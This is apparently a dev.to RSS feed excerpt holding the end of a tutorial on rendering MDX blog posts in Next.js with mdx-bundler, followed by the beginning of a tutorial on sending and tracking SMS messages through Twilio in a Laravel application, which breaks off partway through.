&lt;p&gt;If you want to know more about metadata and why it is important for any developer's blog SEO check out this guide &lt;a href="https://ahrefs.com/blog/seo-meta-tags/"&gt;here&lt;/a&gt;. (I'm thinking about making a post on SEO for developers, &lt;a href="https://twitter.com/thelynchpinau"&gt;reach out to me&lt;/a&gt; if that is something you'd be interested in)&lt;/p&gt;

&lt;p&gt;The next part to note is where we are using the built-in xdm configuration, this allows you to add remark and rehype plugins. This can be really useful to style your code snippets or images. If you're interested you can see a list of available plugins &lt;a href="https://github.com/remarkjs/remark/blob/main/doc/plugins.md#list-of-plugins"&gt;remark here&lt;/a&gt; and &lt;a href="https://github.com/rehypejs/rehype/blob/main/doc/plugins.md#list-of-plugins"&gt;rehype here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Lastly, we return all the data we need to render our posts in a nice little object. Now, let's look at how to render our post and how to get the most of mdx-bundler.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#using-mdxbundler-in-nextjs-blog-posts"&gt;
  &lt;/a&gt;
  Using Mdx-bundler in Next.js Blog Posts
&lt;/h2&gt;

&lt;p&gt;Alright, so the first step we need in order to use mdx-bundler with our Next.js blog is done. Now let's see how to use it with our blog posts component so we can render them to the screen.&lt;/p&gt;

&lt;p&gt;If you followed the Next.js tutorial then you should have a file in your &lt;code&gt;posts&lt;/code&gt; directory called something like &lt;code&gt;[id]&lt;/code&gt; or &lt;code&gt;[slug]&lt;/code&gt; where you utilize the &lt;code&gt;getStaticPaths&lt;/code&gt; and &lt;code&gt;getStaticProps&lt;/code&gt; functions. On my blog I have called it &lt;code&gt;[slug].js&lt;/code&gt; since it makes semantic sense to me.&lt;/p&gt;

&lt;p&gt;In the&lt;code&gt;[slug].js&lt;/code&gt; file, we need to import a few things. The first is the &lt;code&gt;useMemo&lt;/code&gt; hook from the Reacts standard library. The second is &lt;code&gt;getMDXComponent&lt;/code&gt; from the mdx-bundler package. Now your &lt;code&gt;blogPost&lt;/code&gt; component should look similar to the below. We also need to import our data fetching functions, the ones you set up when following the Next.js tutorial.&lt;/p&gt;

&lt;p&gt;Next, we are going to send the &lt;code&gt;code&lt;/code&gt; data from our &lt;code&gt;getPostData&lt;/code&gt; function to our client so that we can render our mdx files. We do this by first passing the &lt;code&gt;code&lt;/code&gt; and &lt;code&gt;frontmatter&lt;/code&gt; props to our &lt;code&gt;BlogPost&lt;/code&gt; component (below).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;frontmatter&lt;/code&gt; prop will let us access our metadata by calling them like objects &lt;code&gt;frontmatter.title&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then, we use the &lt;code&gt;code&lt;/code&gt; prop with the &lt;code&gt;getMDXComponent&lt;/code&gt; function. Here we use the &lt;code&gt;useMemo&lt;/code&gt; hook to prevent the component being created every time we render it which, really helps with performance. Now, our &lt;code&gt;BlogPost&lt;/code&gt; component should look like the below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;BlogPost&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;frontmatter&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Component&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getMDXComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;Component&lt;/code&gt; variable holds all the content of our blog post. We could finish here and render the post by calling &lt;code&gt;&amp;lt;Component /&amp;gt;&lt;/code&gt; within our &lt;code&gt;BlogPost&lt;/code&gt; component. Try it out to see how it renders.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;getMDXComponent&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;mdx-bundler/client&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useMemo&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;getAllPostSlugs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;getPostData&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;../../lib/utils/blogPosts&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;getStaticProps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;postData&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;getPostData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="nx"&gt;postData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;getStaticPaths&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;paths&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getAllPostSlugs&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;paths&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="na"&gt;fallback&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;BlogPost&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;frontmatter&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Component&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getMDXComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;description&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Component&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/article&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you view the post with the correct slug, it will now render all the elements within the mdx file to the screen. That is all you need to get your Next.js project to work with &lt;code&gt;mdx-bundler&lt;/code&gt;. However, there is one more thing you can do that unleashes the full power of &lt;code&gt;mdx-bundler&lt;/code&gt;. Let's see what that is now.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-bundle-up-your-components-with-mdxbundler-and-nextjs"&gt;
  &lt;/a&gt;
  How to Bundle Up Your Components With Mdx-Bundler and Next.js
&lt;/h2&gt;

&lt;p&gt;The absolute cherry on top of mdx-bundler that makes it a joy to work with is that you can "bundle" all of your reuseable components up to save you importing them in every mdx file.&lt;/p&gt;

&lt;p&gt;On my blog I have a few components that get used in every post, things like a &lt;a href="https://www.peterlunch.com/snippets/next-image-styling"&gt;custom styled next/image component&lt;/a&gt; or customer link components. It would be annoying and prone to human error for me to import them into every blog post. Thankfully mdx-bundler is here to save that day.&lt;/p&gt;

&lt;p&gt;To bundle up reusable components we can import them into our &lt;code&gt;[slug].js&lt;/code&gt;. Once we have those files imported, we can pass them as props to our Component element.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;PostImage&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;../components/PostImage&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;InternalAnchor&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;../components/InternalAnchor&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;PostRecommender&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;../components/PostRecommender&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="c1"&gt;// ...&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;BlogPost&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;frontmatter&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Component&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getMDXComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;description&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Component&lt;/span&gt;
              &lt;span class="nx"&gt;componets&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt;
                &lt;span class="nx"&gt;PostImage&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nx"&gt;InternalAnchor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nx"&gt;PostRecommender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
              &lt;span class="p"&gt;}}&lt;/span&gt;
            &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/article&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now you can use these components when writing a post without even having to think about importing them.&lt;/p&gt;

&lt;p&gt;If you're still having trouble getting it working with Next.js you can reach out to me and I'll see how I can help.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>nextjs</category>
      <category>mdx</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>✉ Laravel Twilio SMS Implementation</title>
      <author>sanzocarlos</author>
      <pubDate>Wed, 15 Dec 2021 01:54:24 +0000</pubDate>
      <link>https://dev.to/sanzocarlos/laravel-twilio-sms-implementation-2j19</link>
      <guid>https://dev.to/sanzocarlos/laravel-twilio-sms-implementation-2j19</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PcHpmx0H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/96ieis37fjz3de2iys7b.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PcHpmx0H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/96ieis37fjz3de2iys7b.png" alt="Laravel Twilio SMS Implementation" width="627" height="426"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;Twilio integrations have been a lot more common than I thought during the last few years. So I wanted to write the article I wish I have found the first time a had to do it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.twilio.com/docs/sms/api"&gt;Twilio's SMS API&lt;/a&gt; is a flexible building block that can take you from sending your first text message all the way to sending and receiving millions.&lt;br&gt;
In this article, I will talk about how to set up a Laravel application Twilio configuration and start sending SMS.&lt;/p&gt;

&lt;p&gt;After that, we will dig deeper into how to keep track of the status of sent messages and keep a local updated representation of Twilio messages.&lt;/p&gt;

&lt;p&gt;Finally, we will prepare the application to receive notifications every time your defined Twilio phone number gets a message and then store the received message locally.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#configuration-and-sending-the-first%C2%A0sms"&gt;
  &lt;/a&gt;
  Configuration and sending the first SMS
&lt;/h2&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Get Twilio Credentials and Phone Number&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yWzpBvV1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tv7ngvhp14v6q83ztzap.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yWzpBvV1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tv7ngvhp14v6q83ztzap.png" alt="Twilio Credentials" width="800" height="425"&gt;&lt;/a&gt;&lt;br&gt;
Keep in mind that a trial phone number can only send SMS to verified phones. This means you will have to add the phone number you intend to send messages to a verified numbers list.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YgWAE2Ud--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i40dl4s2iguthtlpand2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YgWAE2Ud--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i40dl4s2iguthtlpand2.png" alt="Twilio Verified Numbers" width="591" height="153"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Add Twilio Credentials to Laravel configuration.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;.env file&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;TWILIO_SID=YOUR_ACCOUNT_SID
TWILIO_AUTH_TOKEN=YOUR_ACCOUNT_AUTH_TOKEN
TWILIO_FROM_NUMBER=YOUR_ACCOUNT_FROM_NUMBER(e.g. +1XXXXXXXXXX)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;/config/app.php&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;'twilio' =&amp;gt; [
    'sid' =&amp;gt; env('TWILIO_SID'),
    'auth_token' =&amp;gt; env('TWILIO_AUTH_TOKEN'),
    'from_number' =&amp;gt; env('TWILIO_FROM_NUMBER')
]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Install Twilio SDK for PHP&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;composer require twilio/sdk&lt;/code&gt;&lt;/p&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Create Twilio Service Class&lt;/strong&gt;&lt;br&gt;
It is convenient to handle all Twilio SMS operations from a single class that is globally available. So every time you send a message you will do it through this service.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;

&lt;p&gt;Remember to bind the service so it is globally accessible. In this case, we will create a provider CustomServiceProvider and bind TwilioService in the boot function.&lt;br&gt;&lt;br&gt;
&lt;code&gt;php artisan make:provider CustomServiceProvider&lt;/code&gt;&lt;br&gt;&lt;/p&gt;

&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;

&lt;p&gt;And then add &lt;strong&gt;App\Providers\CustomServiceProvider::class&lt;/strong&gt; into the $providers array on config/app.php.&lt;br&gt;&lt;br&gt;
Now the TwilioService should be available and we can test it from anywhere.&lt;br&gt;&lt;br&gt;
Also not required, but it will be convenient to add a new channel at &lt;strong&gt;/config/logging.php&lt;/strong&gt; to log Twilio operations, at least for debugging.&lt;br&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...
'twilio' =&amp;gt; [
    'driver' =&amp;gt; 'single',
    'path' =&amp;gt; storage_path('logs/twilio.log'),
    'level' =&amp;gt; 'debug',
],
...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. Create Twilio SMS Controller.&lt;/strong&gt;&lt;br&gt;
If you only care about sending messages then you don't really need to create a controller. You can test and use the TwilioService sendMessage function from anywhere.&lt;/p&gt;

&lt;p&gt;For this implementation, we will use this controller to provide a sendTest function. Later it will also be used to handle &lt;strong&gt;Twilio SMS Status Callback&lt;/strong&gt; requests and &lt;strong&gt;Twilio SMS Received&lt;/strong&gt; requests.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;php artisan make:controller TwilioSmsController&lt;/code&gt;&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;p&gt;Add testing endpoint to your API routes.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Route::any(
'/twilio/send-test',
[TwilioSmsController::class, 'sendTest'])
-&amp;gt;name('twilio.send-test');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;You are ready to make your first test. Hopefully, everything goes right on the first try. If not, you will get a debug error message.&lt;/p&gt;

&lt;p&gt;Common errors you can get:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Invalid number. The provided To number must have &lt;a href="https://medium.com/r/?url=https%3A%2F%2Fwww.twilio.com%2Fdocs%2Fglossary%2Fwhat-e164"&gt;E.164&lt;/a&gt; formatting.&lt;/li&gt;
&lt;li&gt;To phone number not verified. If you are using a trial phone number then you can only send SMS to &lt;a href="https://medium.com/r/?url=https%3A%2F%2Fsupport.twilio.com%2Fhc%2Fen-us%2Farticles%2F223180048-Adding-a-Verified-Phone-Number-or-Caller-ID-with-Twilio"&gt;verified numbers&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://medium.com/r/?url=https%3A%2F%2Fwww.twilio.com%2Fdocs%2Fapi%2Ferrors%2F21408%3Fdisplay%3Dembedded"&gt;Permission to send an SMS has not been enabled for the region indicated by the 'To' number&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;That's it! 🎉 If you only need to send messages then you are ready to go.&lt;/p&gt;

&lt;p&gt;If you want to keep track of the messages you sent and also be able to receive messages in your application then keep reading 👀.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#%C2%A0"&gt;
  &lt;/a&gt;
   
&lt;/h2&gt;
&lt;h2&gt;
  &lt;a href="#track-twilio-sms-status%C2%A0changes"&gt;
  &lt;/a&gt;
  Track Twilio SMS status changes
&lt;/h2&gt;

&lt;p&gt;When we make a send SMS request to Twilio the message has to go through a &lt;a href="https://medium.com/r/?url=https%3A%2F%2Fsupport.twilio.com%2Fhc%2Fen-us%2Farticles%2F223134347-What-are-the-Possible-SMS-and-MMS-Message-Statuses-and-What-do-They-Mean-"&gt;sequence of statuses&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;accepted&lt;/li&gt;
&lt;li&gt;queued&lt;/li&gt;
&lt;li&gt;sending&lt;/li&gt;
&lt;li&gt;sent&lt;/li&gt;
&lt;li&gt;delivery_unknown&lt;/li&gt;
&lt;li&gt;delivered&lt;/li&gt;
&lt;li&gt;undelivered&lt;/li&gt;
&lt;li&gt;failed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The response we get from making a successful send SMS request will tell us that the message status is &lt;strong&gt;queued&lt;/strong&gt;. This just means that Twilio accepted the request and it was added to the queue of messages to send, but we don't know if it was actually sent.&lt;/p&gt;

